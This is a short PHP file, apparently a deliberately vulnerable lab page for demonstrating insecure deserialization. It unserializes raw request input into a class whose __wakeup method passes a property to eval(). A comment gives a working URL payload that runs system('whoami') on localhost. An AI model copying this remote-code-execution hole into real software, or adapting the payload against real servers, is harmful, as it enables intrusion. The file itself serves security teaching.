<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
        else{
            echo "<br/>"; //.$var1;
        }
    }
    else{
        echo ""; # nothing happens here
    }
    // To inject the payload, use the following URL:
    // http://localhost:8042/insecuredeserialization.php?r=O:18:%22PHPObjectInjection%22:1:{s:6:%22inject%22;s:17:%22system(%27whoami%27);%22;}

    //  

    // https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md
?>
